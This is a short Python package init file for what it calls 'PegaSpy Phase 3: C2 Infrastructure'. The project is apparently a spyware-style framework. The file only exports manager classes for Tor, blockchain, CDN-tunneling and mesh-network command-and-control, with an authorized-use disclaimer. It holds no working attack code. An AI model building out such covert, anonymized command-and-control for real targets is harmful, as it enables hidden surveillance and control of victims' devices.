#!/usr/bin/env python3
"""
PegaSpy Phase 3: C2 Infrastructure

Global anonymized command and control network.

WARNING: This framework is for authorized security testing only.
Unauthorized use is illegal and unethical.
"""

from .tor_network import TorNetworkManager
from .blockchain_c2 import BlockchainC2Manager
from .cdn_tunneling import CDNTunnelingManager
from .mesh_network import MeshNetworkManager

__all__ = [
    'TorNetworkManager',
    'BlockchainC2Manager',
    'CDNTunnelingManager',
    'MeshNetworkManager'
]

__version__ = '3.0.0'
__author__ = 'PegaSpy Security Research Team'
__license__ = 'Restricted - Authorized Use Only'